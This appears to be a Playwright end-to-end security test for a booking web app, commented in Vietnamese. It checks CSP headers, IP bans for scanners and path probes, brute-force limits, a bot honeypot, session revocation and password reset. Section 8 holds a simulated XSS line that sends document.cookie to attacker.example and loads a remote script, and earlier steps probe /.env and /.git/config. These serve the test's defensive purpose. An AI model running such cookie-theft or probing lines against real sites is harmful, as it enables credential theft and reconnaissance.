// security_hardening_e2e.mjs — Pha 28: lá chắn chống dò quét/công cụ tấn công, cấm IP, IP giả qua header, đoán mã kích hoạt,
// bẫy bot, thu hồi phiên (web + JWT), quên/đặt lại mật khẩu, CSP chặn script/kết nối lạ.
//   node scripts/security_hardening_e2e.mjs   (CHỈ local; IP thử 203.0.113.x — dải dành cho tài liệu; tự dọn)
import { chromium, request as pwRequest } from 'playwright';
import { execFileSync } from 'child_process';
import crypto from 'crypto';

const BASE = process.env.BASE || 'http://127.0.0.1:5001';
const EMAIL = 'demo.nails.au.006758@bitpawdemo.com', PW = 'DemoNails2026!';
const steps = [];
const rec = (n, ok, note = '') => { steps.push({ n, ok }); console.log(`${ok ? '✅' : '❌'} ${n}${note ? ' — ' + note : ''}`); };
const py = (code) => execFileSync('python', ['-c', code], { encoding: 'utf-8', env: { ...process.env, PYTHONIOENCODING: 'utf-8' } }).trim().split(/\r?\n/).pop();
const TAG = String(Date.now()).slice(-6);
const RUN = Number(TAG) % 250;
const IP = (n) => `198.18.${RUN}.${n}`;
const TEST_EMAIL = `sec.reset.${TAG}@example.com`;

let cleaned = false;
const cleanup = () => {
  if (cleaned) return; cleaned = true;
  py(`
from mongo_client import db
ips = ['198.18.${RUN}.%d' % i for i in range(1, 60)]
db.security_bans.delete_many({'ip': {'$in': ips}}); db.security_strikes.delete_many({'ip': {'$in': ips}})
db.security_events.delete_many({'$or': [{'ip': {'$in': ips}}, {'user': '${TEST_EMAIL}'}]})
db.code_failures.delete_many({'ip': {'$in': ips}})
db.password_resets.delete_many({'email': {'$in': ['${TEST_EMAIL}', 'nobody.${TAG}@example.com']}})
db.users.delete_many({'email': '${TEST_EMAIL}'})
print('cleaned')`);
};
process.on('exit', cleanup);

const api = await pwRequest.newContext({ baseURL: BASE });

// ---- 1. Header bảo mật
let r = await api.get('/login');
const csp = r.headers()['content-security-policy'] || '';
rec('CSP đầy đủ: chặn plugin, đổi <base>, nhúng iframe, script/kết nối lạ', /object-src 'none'/.test(csp) && /base-uri 'self'/.test(csp) && /frame-ancestors 'self'/.test(csp) && /connect-src 'self'/.test(csp) && !/script-src[^;]*\*/.test(csp));
rec('nosniff + chống clickjacking + COOP', r.headers()['x-content-type-options'] === 'nosniff' && r.headers()['x-frame-options'] === 'SAMEORIGIN' && !!r.headers()['cross-origin-opener-policy']);

// ---- 2. Công cụ tấn công + dò đường dẫn -> chặn + cấm IP
r = await api.get('/login', { headers: { 'User-Agent': 'sqlmap/1.7.2#stable (https://sqlmap.org)', 'X-Forwarded-For': IP(11) } });
rec('User-Agent công cụ tấn công (sqlmap) -> 403', r.status() === 403);
r = await api.get('/login', { headers: { 'X-Forwarded-For': IP(11) } });
rec('IP vừa dùng công cụ tấn công bị cấm cả trang thường', r.status() === 403 && !!r.headers()['retry-after'], `retry-after ${r.headers()['retry-after']}`);
for (const pth of ['/.env', '/wp-login.php']) {
  r = await api.get(pth, { headers: { 'X-Forwarded-For': IP(12) } });
}
rec('Dò /.env, /wp-login.php -> 404 (không lộ gì)', r.status() === 404);
r = await api.get('/login', { headers: { 'X-Forwarded-For': IP(12) } });
rec('2 lần dò: chưa cấm (tránh chặn nhầm)', r.status() === 200);
r = await api.get('/.git/config', { headers: { 'X-Forwarded-For': IP(12) } });
r = await api.get('/login', { headers: { 'X-Forwarded-For': IP(12) } });
rec('Lần dò thứ 3 -> IP bị cấm 1 giờ', r.status() === 403);
r = await api.get('/api/bot/customers', { headers: { 'X-Forwarded-For': IP(12), Accept: 'application/json' } });
rec('IP bị cấm gọi API -> 403 JSON', r.status() === 403 && /blocked/i.test(JSON.stringify(await r.json().catch(() => ({})))));
r = await api.get('/login', { headers: { 'X-Forwarded-For': IP(13), 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)' } });
rec('Khách thật ở IP khác không bị ảnh hưởng', r.status() === 200);
const ev = JSON.parse(py(`
import json
from mongo_client import db
print(json.dumps([e['kind'] for e in db.security_events.find({'ip': {'$in': ['${IP(11)}', '${IP(12)}']}}, {'_id': 0, 'kind': 1})]))`));
rec('Ghi nhật ký bảo mật (strike + ban) cho super admin', ev.includes('ban') && ev.includes('strike'), ev.join(','));

// ---- 3. IP giả qua header (trên Vercel): chỉ tin CF-Connecting-IP khi kết nối thật từ Cloudflare
const ipcheck = py(`
import os
os.environ['VERCEL'] = '1'
from flask import Flask, request
import security_shield as s
app = Flask('t')
def ip(h):
    with app.test_request_context('/', headers=h, environ_base={'REMOTE_ADDR': '10.0.0.1'}):
        return s.client_ip(request)
print(ip({'X-Real-IP': '198.51.100.7', 'CF-Connecting-IP': '9.9.9.9'}) + '|' + ip({'X-Real-IP': '104.16.3.4', 'CF-Connecting-IP': '9.9.9.9'}))`);
rec('Gọi thẳng *.vercel.app kèm CF-Connecting-IP giả -> bị bỏ qua; qua Cloudflare thật -> dùng IP khách', ipcheck === '198.51.100.7|9.9.9.9', ipcheck);

// ---- 4. Đoán mã kích hoạt
const b = await chromium.launch({ channel: 'chrome' });
const pctx = await b.newContext({ extraHTTPHeaders: { 'X-Forwarded-For': IP(21) } });
const pg = await pctx.newPage();
await pg.goto(BASE + '/login');
const regTry = async (code) => pg.evaluate(async ([c, t]) => {
  const fd = new URLSearchParams({ email: `codeguess.${t}@example.com`, password: 'Abcdefgh123', business_type: 'nail', business_name: 'X', fullname: 'X', license_key: c });
  const res = await fetch('/register', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: fd });
  return { status: res.status, text: await res.text() };
}, [code, TAG]);
r = await regTry('WRONG-CODE-1');
const failed = Number(py(`
from mongo_client import db
print(db.code_failures.count_documents({'ip': '${IP(21)}'}))`));
rec('Mã kích hoạt sai -> đếm theo IP', failed === 1);
py(`
from datetime import datetime
from mongo_client import db
db.code_failures.insert_many([{'ip': '${IP(21)}', 'at': datetime.utcnow()} for _ in range(8)])
print('ok')`);
r = await regTry('WRONG-CODE-2');
rec('Sai quá 8 mã/giờ -> khoá (429) dù đoán tiếp', r.status === 429 && /Too many incorrect activation codes/.test(r.text), `HTTP ${r.status}`);
const gen = py(`
import os
os.environ.setdefault('FLASK_SECRET_KEY', 'x' * 32); os.environ.setdefault('JWT_SECRET', 'y' * 32)
import re, secrets
alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
code = 'BP-' + '-'.join(''.join(secrets.choice(alphabet) for _ in range(5)) for _ in range(4))
rx = re.compile(r'^BP(-[A-HJ-NP-Z2-9]{5}){4}$')
print(bool(rx.match(code)), bool(rx.match('BITPAW-AB12CD34')), bool(rx.match('JESSICA123456')))`);
rec('Mã kích hoạt mới: 20 ký tự ngẫu nhiên; mã kiểu "TEN123456" bị từ chối', gen === 'True False False', gen);
await pctx.close();

// ---- 5. Bẫy bot (form đặt lịch công khai)
r = await api.post('/create_appointment', { headers: { 'X-Forwarded-For': IP(30) }, data: { name: 'Bot', phone: '0400000000', service_id: 277, book_time: '2027-01-05T10:00' } });
rec('Gọi thẳng API đặt lịch không có mã CSRF -> bị chặn', r.status() === 400);
const bctx = await b.newContext({ extraHTTPHeaders: { 'X-Forwarded-For': IP(31) } }), BP = await bctx.newPage();
await BP.goto(BASE + '/booking/nail/qr/000b2c16-ab4e-42bd-944a-29c925cad09b');
const hpRes = await BP.evaluate(async () => { const res = await fetch('/create_appointment', { method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Bot', phone: '0400000000', service_id: 277, book_time: '2027-01-05T10:00', company_website: 'http://spam.example' }) });
  return { s: res.status, j: await res.json().catch(() => ({})) }; });
const hpVisible = await BP.evaluate(() => { const el = document.getElementById('cus_company_website'); if (!el) return 'missing';
  const r = el.getBoundingClientRect(); return !(r.right <= 0 || getComputedStyle(el).opacity === '0') || el.tabIndex !== -1; });
await bctx.close();
r = { status: () => hpRes.s }; let j = hpRes.j;
const botAppt = Number(py(`
from mongo_client import db
print(db.appointments.count_documents({'customer_phone': '0400000000', 'customer_name': 'Bot'}))`));
rec('Bot điền ô ẩn -> nhận "thành công" giả, KHÔNG tạo lịch', r.status() === 200 && j.success === true && botAppt === 0, `HTTP ${r.status()}`);
rec('Ô bẫy bot không hiện với khách thật', hpVisible === false);

// ---- 6. Thu hồi phiên: "đăng xuất mọi nơi" (web + JWT app)
const ctxA = await b.newContext(), A = await ctxA.newPage();
const login = async (page) => { await page.goto(BASE + '/login'); await page.fill('#loginEmail', EMAIL); await page.fill('#loginPassword', PW);
  await Promise.all([page.waitForLoadState('networkidle').catch(() => {}), page.click('#btnLogin')]); };
await login(A);
const fetchA = (u) => A.evaluate(async (url) => (await fetch(url, { headers: { Accept: 'application/json' } })).status, u);
rec('Phiên A đang dùng bình thường', await fetchA('/api/bot/customers') === 200);
const tok = await (await api.post('/api/auth/token', { data: { email: EMAIL, password: PW } })).json();
r = await api.get('/api/bot/customers', { headers: { Authorization: `Bearer ${tok.access_token}` } });
rec('Token app di động (JWT) dùng được', r.status() === 200);
const ctxB = await b.newContext(), B = await ctxB.newPage();
await login(B);
const lo = await B.evaluate(async () => (await fetch('/api/account/logout_all', { method: 'POST' })).json());
rec('"Đăng xuất mọi nơi" từ máy B', lo.success === true);
rec('Máy A bị đăng xuất ngay (API 401)', await fetchA('/api/bot/customers') === 401);
await A.goto(BASE + '/calendar');
rec('Máy A mở trang -> về trang đăng nhập', /\/login/.test(A.url()));
r = await api.get('/api/bot/customers', { headers: { Authorization: `Bearer ${tok.access_token}` } });
rec('Token app di động cũ hết hiệu lực (401)', r.status() === 401);
await login(A);
rec('Đăng nhập lại bình thường', await fetchA('/api/bot/customers') === 200);
await ctxA.close(); await ctxB.close();

// ---- 7. Quên / đặt lại mật khẩu (user thử riêng)
py(`
from werkzeug.security import generate_password_hash
from mongo_client import db, next_mongo_id
uid = 'sec-test-${TAG}'
db.users.insert_one({'id': uid, 'email': '${TEST_EMAIL}', 'password_hash': generate_password_hash('OldPassw0rd!'), 'role': 'admin', 'business_id': uid, 'full_name': 'Sec Test'})
print(uid)`);
let fip = 40;
const forgot = async (email) => { const p = await (await b.newContext({ extraHTTPHeaders: { 'X-Forwarded-For': IP(++fip) } })).newPage(); await p.goto(BASE + '/login');
  return p.evaluate(async (e) => { const res = await fetch('/api/auth/forgot_password', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: e, lang: 'en' }) }); return { s: res.status, j: await res.json() }; }, email); };
const f1 = await forgot(TEST_EMAIL), f2 = await forgot(`nobody.${TAG}@example.com`);
rec('Quên mật khẩu: email có/không có tài khoản -> CÙNG câu trả lời (không dò được email)', f1.s === 200 && f2.s === 200 && f1.j.message === f2.j.message);
const saved = py(`
from mongo_client import db
d = db.password_resets.find_one({'email': '${TEST_EMAIL}'})
print('%s|%s' % (len(d['token_hash']), 'token' in d))`);
rec('Link đặt lại chỉ lưu bản băm (lộ DB cũng không dùng được)', saved === '64|False', saved);
const token = crypto.randomBytes(32).toString('base64url');
py(`
import hashlib
from datetime import datetime, timedelta
from mongo_client import db
db.password_resets.insert_one({'token_hash': hashlib.sha256('${token}'.encode()).hexdigest(), 'user_id': 'sec-test-${TAG}', 'email': '${TEST_EMAIL}', 'used': False,
  'created_at': datetime.utcnow(), 'expires_at': datetime.utcnow() + timedelta(minutes=30)})
db.password_resets.insert_one({'token_hash': hashlib.sha256('expired-${token}'.encode()).hexdigest(), 'user_id': 'sec-test-${TAG}', 'email': '${TEST_EMAIL}', 'used': False,
  'created_at': datetime.utcnow(), 'expires_at': datetime.utcnow() - timedelta(minutes=1)})
print('ok')`);
const rc = await b.newContext({ viewport: { width: 390, height: 844 }, extraHTTPHeaders: { 'X-Forwarded-For': IP(49) } }), R = await rc.newPage();
const jsErr = []; R.on('pageerror', (e) => jsErr.push(e.message));
await R.goto(`${BASE}/reset-password/expired-${token}`);
rec('Link hết hạn -> báo rõ, không cho đổi', /expired|hết hạn/i.test(await R.textContent('h1')));
await R.goto(`${BASE}/reset-password/${token}`);
await R.fill('#password', 'NewPassw0rd!2026'); await R.fill('#password2', 'Different123');
await R.click('button[type=submit]');
rec('Hai mật khẩu không khớp -> báo lỗi', /don't match|không khớp/i.test(await R.textContent('body')));
await R.fill('#password', 'NewPassw0rd!2026'); await R.fill('#password2', 'NewPassw0rd!2026');
await Promise.all([R.waitForNavigation().catch(() => {}), R.click('button[type=submit]')]);
rec('Đổi mật khẩu xong -> về trang đăng nhập', /\/login/.test(R.url()));
const ok = await (await api.post('/api/auth/token', { data: { email: TEST_EMAIL, password: 'NewPassw0rd!2026' } })).status();
const old = await (await api.post('/api/auth/token', { data: { email: TEST_EMAIL, password: 'OldPassw0rd!' } })).status();
rec('Mật khẩu mới dùng được, mật khẩu cũ bị từ chối', ok === 200 && old === 401, `${ok}/${old}`);
await R.goto(`${BASE}/reset-password/${token}`);
rec('Link đã dùng không dùng lại được', /expired|hết hạn/i.test(await R.textContent('h1')));
const sv = py(`
from mongo_client import db
print(db.users.find_one({'email': '${TEST_EMAIL}'}).get('session_ver'))`);
rec('Đổi mật khẩu -> mọi phiên cũ bị thu hồi (session_ver tăng)', sv === '1', `session_ver=${sv}`);
await R.goto(BASE + '/login');
await R.click('#btn_forgot').catch(() => {});
await R.fill('#resetEmail', TEST_EMAIL);
await R.click('#btnReset');
await R.waitForTimeout(1500);
const toastTxt = await R.evaluate(() => document.body.innerText);
rec('Nút "Quên mật khẩu" trên trang đăng nhập gửi thật (hết báo "chưa khả dụng")', /we've sent a link|đã gửi link/i.test(toastTxt) && !/not available yet|chưa khả dụng/i.test(toastTxt));
rec('Trang đặt lại mật khẩu không lỗi JS (iPhone)', jsErr.length === 0, jsErr.slice(0, 2).join(' | '));
await rc.close();

// ---- 8. CSP chặn script / gửi dữ liệu ra domain lạ (giả lập XSS)
const xc = await b.newContext(); await xc.addInitScript(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective)); });
const X = await xc.newPage(); await X.goto(BASE + '/login', { waitUntil: 'networkidle' });
const xs = await X.evaluate(async () => { let blocked = false; try { await fetch('https://attacker.example/steal?c=' + document.cookie); } catch (e) { blocked = true; }
  const s = document.createElement('script'); s.src = 'https://attacker.example/x.js'; document.head.appendChild(s); await new Promise((r) => setTimeout(r, 600)); return { blocked, v: window.__csp }; });
rec('Script độc chèn vào trang không gửi được dữ liệu ra ngoài, không tải được script lạ', xs.blocked && xs.v.includes('connect-src') && xs.v.some((d) => d.startsWith('script-src')), xs.v.join(','));
await xc.close();

await b.close();
cleanup();
const fail = steps.filter((s) => !s.ok).length;
console.log(`\nTổng: ${steps.length - fail} PASS · ${fail} FAIL`);
process.exit(fail ? 1 : 0);
